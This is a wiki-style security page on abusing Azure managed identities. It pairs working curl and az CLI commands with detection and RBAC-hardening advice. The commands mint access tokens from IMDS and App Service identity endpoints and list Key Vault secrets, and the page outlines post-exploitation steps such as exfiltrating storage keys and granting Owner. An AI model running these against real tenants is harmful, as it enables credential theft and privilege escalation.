---
title: Azure managed identity abuse
slug: azure-managed-identity-abuse
---

> **TL;DR:** Any code on an Azure resource with a managed identity can read `IDENTITY_ENDPOINT`/`MSI_ENDPOINT` (or VM IMDS) and mint an Entra access token for ARM, Graph, or Key Vault — the only gate is whatever RBAC the identity was given.

## What it is
Managed identities are Entra service principals bound to Azure resources. On a VM they are served by the `169.254.169.254` IMDS endpoint behind the `Metadata: true` header; on App Service, Functions, Container Apps, and Automation they are served by a local HTTPS-ish endpoint whose URL and shared secret live in `IDENTITY_ENDPOINT`/`IDENTITY_HEADER` (older runtimes used `MSI_ENDPOINT`/`MSI_SECRET`). Either path mints an OAuth access token for an arbitrary `resource` audience — ARM, Graph, Key Vault, Storage — that the attacker uses with the `az` CLI or raw REST.

## Preconditions / where it applies
- Code execution or header-capable SSRF on a VM, App Service, Function, Container App, Logic App, AKS pod with workload identity, or Automation runbook.
- The resource has a system- or user-assigned managed identity attached (`az vm identity show`, `az webapp identity show`).
- The identity has at least one role assignment — most enterprises drift to `Contributor` or `Key Vault Secrets User` at resource-group scope.

## Technique
```bash
# VM IMDS — Metadata: true header is mandatory
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# App Service / Functions — env vars provide endpoint + shared secret
curl -s "$IDENTITY_ENDPOINT?resource=https://graph.microsoft.com&api-version=2019-08-01" \
  -H "X-IDENTITY-HEADER: $IDENTITY_HEADER"

# Use the ARM token via az CLI
TOK=$(curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
  | jq -r .access_token)

az login --identity            # simplest if az is on the box
az account show
az role assignment list --assignee $(az ad signed-in-user show --query id -o tsv)
az keyvault secret list --vault-name corp-prod-kv
```

Typical post-ex wins: App Service with `Contributor` on its resource group → deploy a function that exfils Storage account keys; AKS workload identity with `Key Vault Secrets User` → silent secret pull; Logic App with `User Access Administrator` → grant yourself `Owner` and persist.

## Detection and defence
- Audit RBAC on every managed identity quarterly; remove `Contributor`/`Owner` at subscription scope and prefer scoped, custom roles.
- Lock down `IDENTITY_ENDPOINT` exposure: App Service worker-process isolation, no debug-console paths reachable by app code.
- Entra Activity Log + Azure Activity Log: alert on `Microsoft.Authorization/roleAssignments/write` from managed identities and on tokens minted for Graph by identities that have never used Graph before.
- Conditional Access policies that block managed-identity tokens from being reused outside expected Azure source IPs are not yet GA — compensate with sign-in risk policies on the SP object.

## References
- [Microsoft — Managed identities overview](https://learn.microsoft.com/en-us/entra/identity/managed-identities-azure-resources/overview) — endpoint and binding reference.
- [HackTricks Cloud — Managed identities](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-services/az-managed-identities.html) — per-resource abuse recipes.

See also: [[managed-identities]], [[az-cli-tokens]], [[azure-key-vault-attacks]], [[service-principal-abuse]], [[aws-imds-ssrf-pivot]], [[gcp-metadata-token-theft]].
